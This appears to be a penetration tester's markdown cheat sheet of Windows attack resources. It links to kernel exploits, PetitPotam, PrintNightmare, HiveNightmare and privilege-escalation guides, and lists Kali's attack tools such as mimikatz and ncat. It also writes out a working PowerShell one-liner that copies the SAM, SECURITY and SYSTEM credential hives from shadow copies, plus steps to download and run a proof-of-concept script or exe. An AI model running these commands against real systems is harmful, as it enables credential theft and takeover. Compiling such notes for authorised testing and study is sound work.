# Living Off the Land:
https://lolbas-project.github.io/

# Windows Exploits:
1. Windows Kernel Exploits — https://github.com/SecWiki/windows-kernel-exploits
2. LOLBins - https://lolbas-project.github.io/#
3. Windows Takeover completely from Linux — https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux
4. Windows Credentials — https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them
5. Microsoft Won't Fix List — https://github.com/cfalta/MicrosoftWontFixList/blob/main/README.md
6. https://github.com/GossiTheDog/HiveNightmare
7. https://github.com/GossiTheDog/SystemNightmare
8. https://github.com/leechristensen/SpoolSample
9. https://github.com/topotam/PetitPotam
10. https://github.com/antonioCoco/RemotePotato0
11. https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH
12. https://github.com/cube0x0/CVE-2021-1675

### HiveNightmare Powershell One Liner:
https://twitter.com/splinter_code/status/1420546784250769408
```
powershell -c "foreach ($i in 1..10){$p='\\.\HarddiskVolumeShadowCopy{0}\windows\system32\config\' -f $i; gi $($p+'SAM'),$($p+'SECURITY'),$($p+'SYSTEM') -ErrorAction SilentlyContinue | % {cp $_.FullName $($_.BaseName+$i)}}"
```



### System Nightmare Incognito 
Install Packages if Needed.
```
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade Pillow
or
python -m pip install --upgrade pip
python -m pip install --upgrade Pillow
Install Bitstring
python3 -m pip install --upgrade bitstring
```
Download: 
1. https://raw.githubusercontent.com/ciwen3/Public/master/python/steganography/Steganograpy-PoC.py
2. https://github.com/ciwen3/Public/raw/master/python/steganography/resources/rednightmare.PNG

In CMD run:
```
python ./Steganograpy-Poc.py ./rednightmare.PNG
```
Alternate:
download the exe (might get flagged as malicious)
https://github.com/ciwen3/Public/blob/master/python/steganography/Steganograpy-PoC.exe?raw=true

# Windows AD take over completely from Linux:
https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux

# Windows Login Credentials:
https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them

# Checklist:
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

# Windows Privilege Escalation:
https://www.fuzzysecurity.com/tutorials/16.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


# Find Windows 10 Product Key on a New Computer:
```
wmic path SoftwareLicensingService get OA3xOriginalProductKey
```

# Windows Resources in Kali:
```
/usr/share/windows-resources$ ls

binaries  
hyperion  
mimikatz  
ncat      
nishang  
ollydbg  
powersploit  
sbd          
sqldict  
tftpd32
wce
```
